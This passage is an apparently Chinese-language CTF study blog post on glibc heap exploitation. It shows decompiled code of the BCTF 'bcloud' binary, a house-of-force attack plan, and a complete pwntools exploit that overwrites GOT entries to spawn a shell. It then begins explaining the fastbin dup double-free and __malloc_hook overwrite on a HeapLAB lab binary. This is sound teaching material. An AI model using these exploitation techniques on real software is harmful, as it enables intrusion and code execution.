class="hljs-type">int</span> <span class="hljs-title function_">name_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+5Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your name:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)s, <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;\n&#x27;</span>);<br>  v2 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  name_chunk_0x40 = (<span class="hljs-type">int</span>)v2;<br>  <span class="hljs-built_in">strcpy</span>(v2, s);<br>  some_output(v2);                              <span class="hljs-comment">// 信息泄露</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">some_output</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;</span>, a1);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now let&#x27;s set synchronization options.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>在后面的<code>org_host_init</code>函数中对于org及host的初始化也像上述一样，我们注意到<code>strcpy</code>在给org赋值的时候会将org字符串、org返回地址以及host字符串全部赋给org，从而造成堆溢出构造我们使用<code>house of force</code>的条件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">org_host_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> org_chunk_con[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-9Ch] BYREF</span><br>  <span class="hljs-type">char</span> *org_chunk; <span class="hljs-comment">// [esp+5Ch] [ebp-5Ch]</span><br>  <span class="hljs-type">char</span> host_chunk_con[<span class="hljs-number">68</span>]; <span class="hljs-comment">// [esp+60h] [ebp-58h] BYREF</span><br>  <span class="hljs-type">char</span> *host_chunk; <span class="hljs-comment">// [esp+A4h] [ebp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+ACh] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">memset</span>(org_chunk_con, <span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Org:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)org_chunk_con, <span class="hljs-number">64</span>, <span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Host:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)host_chunk_con, <span class="hljs-number">64</span>, <span class="hljs-number">10</span>);<br>  host_chunk = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  org_chunk = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  org_chunk_addr = (<span class="hljs-type">int</span>)org_chunk;<br>  host_chunk_addr = (<span class="hljs-type">int</span>)host_chunk;<br>  <span class="hljs-built_in">strcpy</span>(host_chunk, host_chunk_con);<br>  <span class="hljs-built_in">strcpy</span>(org_chunk, org_chunk_con);    <span class="hljs-comment">// &lt;---</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OKay! Enjoy:)&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>在后续的<code>new_note</code>、<code>show_note</code> 、<code>edit_note</code>、 <code>del_note</code>便为常规操作，值得注意的是程序最多创建10个node，将其地址和大小分别储存在<code>node_list</code>和<code>node_size_list</code>中，从而方便我们使用<code>edit_note</code>的时候修改某些值。</p>
+</li>
+</ul>
+<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><ul>
+<li>泄漏 heap 地址</li>
+<li>利用溢出修改 top chunk 的 size</li>
+<li>分配一个 chunk，将 top chunk 转移到 node_size_list 数组前面</li>
+<li>再次分配 chunk，即可覆盖 node_list ，并利用 Edit 修改其内容</li>
+<li>修改 <code>free@got.plt</code> 为 <code>puts@got.plt</code>，泄漏 libc</li>
+<li>修改 <code>atoi@got.plt</code> 为 <code>system@got.plt</code>，得到 shell</li>
+</ul>
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
+<li><p>使用name的输入 -》 泄露堆地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak the heap addr</span><br><span class="hljs-comment"># dbg()</span><br>io.sendafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>)<br>heap = u32(io.recvuntil(<span class="hljs-string">b&quot;! Welcome to BCTF&quot;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">4</span>:])<br>log.info(<span class="hljs-string">f&quot;heap_addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220814182744179.png" srcset="/img/loading.gif" lazyload alt="image-20220814182744179"></p>
+</li>
+<li><p>利用org和host的输入 -》 修改top chunk的size为-1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># overflow</span><br>io.sendafter(<span class="hljs-string">&quot;Org:\n&quot;</span>, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x40</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Host:\n&quot;</span>, p32(<span class="hljs-number">0xffffffff</span>))<br><span class="hljs-comment"># dbg()</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220814194641198.png" srcset="/img/loading.gif" lazyload alt="image-20220814194641198"></p>
+</li>
+<li><p>计算hack_chunk 的大小 将top_chunk移动至bss段</p>
+<p>0x804b0a0 -&gt; note_size_list</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">new((<span class="hljs-number">0x804b0a0</span> - <span class="hljs-number">0x10</span>) - (heap + <span class="hljs-number">0xd0</span>), <span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
+<li><p>新建一个chunk 覆盖note_list 数组，并修改其内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span><br>payload += p32(elf.got.free) <span class="hljs-comment"># note[0]</span><br>payload += p32(elf.got.atoi) * <span class="hljs-number">2</span> <span class="hljs-comment"># note[1] note[2]</span><br>new(<span class="hljs-number">0x8c</span>, payload)<br><span class="hljs-comment"># dbg()</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220814212052885.png" srcset="/img/loading.gif" lazyload alt="image-20220814212052885"></p>
+</li>
+<li><p>修改free_got 为 puts_got 泄露libc地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># free@got.plt -&gt; puts@plt</span><br>edit(<span class="hljs-number">0</span>, p32(elf.plt.puts))<br>dele(<span class="hljs-number">1</span>)<br>atoi_addr = u32(io.recvn(<span class="hljs-number">4</span>))<br>io.recv()<br>libc.address = atoi_addr - libc.sym.atoi<br>log.info(<span class="hljs-string">f&quot;libc addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220814212638115.png" srcset="/img/loading.gif" lazyload alt="image-20220814212638115"></p>
+</li>
+<li><p>修改 atoi_got 为 system_got， 获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">system_addr = libc.sym.system<br>log.info(<span class="hljs-string">f&quot;system addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym.system)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># dbg()</span><br>io.sendline(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">2</span>, p32(system_addr))<br>io.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220814214814810.png" srcset="/img/loading.gif" lazyload alt="image-20220814214814810"></p>
+</li>
+</ul>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = context.binary = ELF(<span class="hljs-string">&#x27;./bcloud&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>io = start()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">length, context</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;note content:\n&quot;</span>, <span class="hljs-built_in">str</span>(length))<br>    io.sendlineafter(<span class="hljs-string">&quot;content:\n&quot;</span>, context)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, context</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.sendlineafter(<span class="hljs-string">&quot;content:\n&quot;</span>, context)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;id:\n&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(io)<br>    pause()<br><span class="hljs-comment"># leak the heap addr</span><br><span class="hljs-comment"># dbg()</span><br>io.sendafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>)<br>heap = u32(io.recvuntil(<span class="hljs-string">b&quot;! Welcome to BCTF&quot;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">4</span>:])<br>log.info(<span class="hljs-string">f&quot;heap_addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># overflow</span><br>io.sendafter(<span class="hljs-string">&quot;Org:\n&quot;</span>, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x40</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Host:\n&quot;</span>, p32(<span class="hljs-number">0xffffffff</span>))<br><span class="hljs-comment"># dbg()</span><br><br>new((<span class="hljs-number">0x804b0a0</span> - <span class="hljs-number">0x10</span>) - (heap + <span class="hljs-number">0xd0</span>), <span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><span class="hljs-comment"># new((0xffffffff - (heap + 0xd0) + (0x804b0a0 - 0x10)), b&#x27;aaaa&#x27;)</span><br><span class="hljs-comment"># dbg()</span><br><span class="hljs-comment"># new(0x40, b&quot;a&quot;*0x40)</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span><br>payload += p32(elf.got.free) <span class="hljs-comment"># note[0]</span><br>payload += p32(elf.got.atoi) * <span class="hljs-number">2</span> <span class="hljs-comment"># note[1] note[2]</span><br>new(<span class="hljs-number">0x8c</span>, payload)<br><span class="hljs-comment"># dbg()</span><br><span class="hljs-comment"># free@got.plt -&gt; puts@plt</span><br>edit(<span class="hljs-number">0</span>, p32(elf.plt.puts))<br>dele(<span class="hljs-number">1</span>)<br>atoi_addr = u32(io.recvn(<span class="hljs-number">4</span>))<br>io.recv()<br>libc.address = atoi_addr - libc.sym.atoi<br>log.info(<span class="hljs-string">f&quot;libc addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br><br>system_addr = libc.sym.system<br>log.info(<span class="hljs-string">f&quot;system addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym.system)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># dbg()</span><br>io.sendline(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">2</span>, p32(system_addr))<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="Fastbin-Dub"><a href="#Fastbin-Dub" class="headerlink" title="Fastbin Dub"></a>Fastbin Dub</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>利用double-free错误，强制malloc返回一个chunk两次，中间不释放它。这种技术通常是通过破坏fastbin元数据，将一个假的块链接到fastbin中来利用的。这个假块可以被分配，然后程序功能可以被用来读取或写入一个任意的内存位置。</p>
+<h4 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h4><p>fastbin中double free检查只确保被释放到fastbin中的块不是该bin中的第一个块(链表头部的块、刚刚释放的块)，如果在两个bin之间释放了一个相同大小的不同块，则检查通过。</p>
+<ul>
+<li><p>正常情况:</p>
+<p><img src="Heap.assets/image-20220820160146712.png" srcset="/img/loading.gif" lazyload alt="image-20220820160146712"></p>
+</li>
+<li><p>double free:</p>
+<p><img src="Heap.assets/image-20220820161049541.png" srcset="/img/loading.gif" lazyload alt="image-20220820161049541"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">               (i.e., double free).  */</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>)) &#123;<br>                errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">               size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">               only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = fastbin_index(chunksize(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);<br><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="hljs-number">0</span>)) &#123;<br>            errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>绕过 double free:</p>
+<p><img src="Heap.assets/image-20220820162024274.png" srcset="/img/loading.gif" lazyload alt="image-20220820162024274"></p>
+</li>
+</ul>
+<p>除此之外，在释放时还会检查当前块的size域与头部域是否相等，由于我们释放的是同一个块，也就不存在该问题。</p>
+<h4 id="如何利用fastbin-dup"><a href="#如何利用fastbin-dup" class="headerlink" title="如何利用fastbin dup"></a>如何利用fastbin dup</h4><p>将一个块二次释放后，我们继续malloc一个相同大小的块，此时malloc将从fastbin中创建块，而不是在top chunk中创建。此时我们往这个块中填写数据就意味着我们正在修改这个块的fd指针，将其修改为一个我们想要的值即可。</p>
+<p><img src="Heap.assets/image-20220820164643151.png" srcset="/img/loading.gif" lazyload alt="image-20220820164643151"></p>
+<p>但是此过程中也存在着一个对size域的检查措施，因此我们常常使用__malloc_hook前35字节所出现的一个0x7f的大小字段，然后将__malloc_hook修改为one_gadget。所需要注意的是假尺寸字段中不兼容的标志，一个设置的NON_MAIN_ARENA标志和一个清除的 CHUNK_IS_MMAPPED标志会导致一个segfault。能够这样做的原因是，分配既不受对齐检查，也不受标志损坏检查</p>
+<p><img src="Heap.assets/image-20220820181022737.png" srcset="/img/loading.gif" lazyload alt="image-20220820181022737"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ())) &#123;<br>    idx = fastbin_index (nb);<br>    mfastbinptr *fb = &amp;fastbin (av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))<br>             != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index (chunksize(victim)) != idx, <span class="hljs-number">0</span>)) &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>            malloc_printerr(check_action, errstr, chunk2mem (victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        check_remalloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="示例一：fastbin-dup"><a href="#示例一：fastbin-dup" class="headerlink" title="示例一：fastbin_dup"></a>示例一：fastbin_dup</h4><blockquote>
+<p>文件详见附件 <a href="attachment/fastbin_dup/fastbin_dup">fastbin_dup</a></p>
+</blockquote>
+<h5 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h5><ul>
+<li>修改target的值</li>
+<li>获取shell</li>
+</ul>
+<h5 id="检查安全措施-2"><a href="#检查安全措施-2" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/fastbin_dup]<br>└─$ checksec fastbin_dup   <br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/fastbin_dup/fastbin_dup&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.30_no-tcache&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h5><p>在程序运行时给出了libc的地址，并未阻止double free的操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-4Ch]</span><br>  <span class="hljs-type">size_t</span> n; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span><br>  <span class="hljs-type">unsigned</span> __int64 na; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  Fastbin Dup&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  <span 